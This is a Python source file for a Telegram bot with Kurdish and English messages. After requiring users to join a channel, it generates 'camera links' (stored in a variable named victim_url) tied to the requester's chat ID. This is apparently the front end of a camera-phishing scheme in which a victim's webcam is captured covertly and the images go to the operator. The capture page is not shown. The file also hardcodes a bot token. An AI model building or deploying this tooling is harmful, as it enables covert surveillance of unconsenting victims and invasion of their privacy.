import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
)

# =========================================================
# CONFIGURATION
# =========================================================
BOT_TOKEN = "8990453981:AAGRIeKWZL_tdsd6KriIScEjghklnsgDSOU"
BASE_URL = "https://example.com"
CHANNEL_USERNAME = "@dev_y7_krd"
# =========================================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

user_languages = {}

TEXTS = {
    "ckb": {
        "join_req": (
            f"⚠️ تکایە سەرەتا جۆینی کەناڵەکەمان بکە بۆ ئەوەی بۆتەکەت بۆ"
            f" کاربکات:\n\n📢 {CHANNEL_USERNAME}"
        ),
        "btn_join": "📢 جۆینی کەناڵ بکە",
        "btn_check": "🔄 پشکنینەوە (جۆین بووم)",
        "not_joined": (
            "❌ تۆ هێشتا جۆینی کەناڵەکەت نەکردووە! تکایە سەرەتا جۆین بکە."
        ),
        "link_ready": (
            "✅ لینکی کامێراکەت ئامادەیە!\n\n🔗 {url}\n\n⏳ دۆخ: چاوەڕێی"
            " دەستپێگەیشتن..."
        ),
        "new_link_ready": (
            "✅ لینکی نوێی کامێراکەت ئامادەیە!\n\n🔗 {url}\n\n⏳ دۆخ: چاوەڕێی"
            " دەستپێگەیشتن..."
        ),
        "btn_open": "🎯 بەستەری کامێرا بکەرەوە",
        "btn_generate": "🔄 دروستکردنی لینکی نوێ",
        "stats": (
            "📊 دۆخی بۆت: بە باشی کاردەکات!\nدەتوانی /start بەکاربهێنیت بۆ"
            " دروستکردنی لینک."
        ),
    },
    "en": {
        "join_req": (
            "⚠️ Please join our channel first to use the"
            f" bot:\n\n📢 {CHANNEL_USERNAME}"
        ),
        "btn_join": "📢 Join Channel",
        "btn_check": "🔄 Check Membership",
        "not_joined": (
            "❌ You have not joined the channel yet! Please join first."
        ),
        "link_ready": (
            "✅ Your Camera Link is Ready!\n\n🔗 {url}\n\n⏳ Status: Waiting for"
            " access..."
        ),
        "new_link_ready": (
            "✅ Your New Camera Link is Ready!\n\n🔗 {url}\n\n⏳ Status: Waiting"
            " for access..."
        ),
        "btn_open": "🎯 Open Camera Link",
        "btn_generate": "🔄 Generate New Link",
        "stats": (
            "📊 Bot Status: Running smoothly!\nUse /start to generate links."
        ),
    },
}


async def check_channel_member(bot, user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(
            chat_id=CHANNEL_USERNAME, user_id=user_id
        )
        return member.status in ["creator", "administrator", "member"]
    except Exception as e:
        logging.error(f"Error in channel check: {e}")
        return False


async def show_join_message(update: Update, lang: str):
    t = TEXTS[lang]
    clean_username = CHANNEL_USERNAME.replace("@", "")
    channel_url = f"https://t.me/{clean_username}"

    keyboard = [
        [InlineKeyboardButton(t["btn_join"], url=channel_url)],
        [InlineKeyboardButton(t["btn_check"], callback_data="check_join")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.message:
        await update.message.reply_text(
            t["join_req"], reply_markup=reply_markup, parse_mode="Markdown"
        )
    elif update.callback_query:
        await update.callback_query.edit_message_text(
            t["join_req"], reply_markup=reply_markup, parse_mode="Markdown"
        )


async def ask_language(update: Update):
    keyboard = [[
        InlineKeyboardButton("کوردی ☀️", callback_data="set_lang_ckb"),
        InlineKeyboardButton("English 🇬🇧", callback_data="set_lang_en"),
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = "🌐 تکایە زمانێک هەڵبژێرە / Please select a language:"

    if update.message:
        await update.message.reply_text(
            msg, reply_markup=reply_markup, parse_mode="Markdown"
        )
    elif update.callback_query:
        await update.callback_query.edit_message_text(
            msg, reply_markup=reply_markup, parse_mode="Markdown"
        )


async def send_main_link(
    update: Update, context: ContextTypes.DEFAULT_TYPE, is_new: bool = False
):
    user_id = str(update.effective_user.id)
    lang = user_languages.get(int(user_id), "ckb")
    t = TEXTS[lang]

    victim_url = f"{BASE_URL}?chat_id={user_id}"

    keyboard = [
        [InlineKeyboardButton(t["btn_open"], url=victim_url)],
        [InlineKeyboardButton(t["btn_generate"], callback_data="generate")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = (
        t["new_link_ready"].format(url=victim_url)
        if is_new
        else t["link_ready"].format(url=victim_url)
    )

    if update.message:
        await update.message.reply_text(
            text, reply_markup=reply_markup, parse_mode="Markdown"
        )
    elif update.callback_query:
        await update.callback_query.edit_message_text(
            text, reply_markup=reply_markup, parse_mode="Markdown"
        )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in user_languages:
        await ask_language(update)
        return

    lang = user_languages[user_id]

    is_joined = await check_channel_member(context.bot, user_id)
    if not is_joined:
        await show_join_message(update, lang)
        return

    await send_main_link(update, context, is_new=False)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    if data.startswith("set_lang_"):
        await query.answer()
        selected_lang = data.split("_")[2]
        user_languages[user_id] = selected_lang

        is_joined = await check_channel_member(context.bot, user_id)
        if not is_joined:
            await show_join_message(update, selected_lang)
        else:
            await send_main_link(update, context, is_new=False)
        return

    if user_id not in user_languages:
        await query.answer()
        await ask_language(update)
        return

    lang = user_languages[user_id]

    if data == "check_join":
        is_joined = await check_channel_member(context.bot, user_id)
        if is_joined:
            await query.answer("✅ ڕاستکراوەی دەستگەیشتن!")
            await send_main_link(update, context, is_new=False)
        else:
            await query.answer(TEXTS[lang]["not_joined"], show_alert=True)
        return

    if not await check_channel_member(context.bot, user_id):
        await query.answer()
        await show_join_message(update, lang)
        return

    if data == "generate":
        await query.answer()
        await send_main_link(update, context, is_new=True)


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = user_languages.get(user_id, "ckb")
    await update.message.reply_text(TEXTS[lang]["stats"], parse_mode="Markdown")


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is starting...")
    app.run_polling()
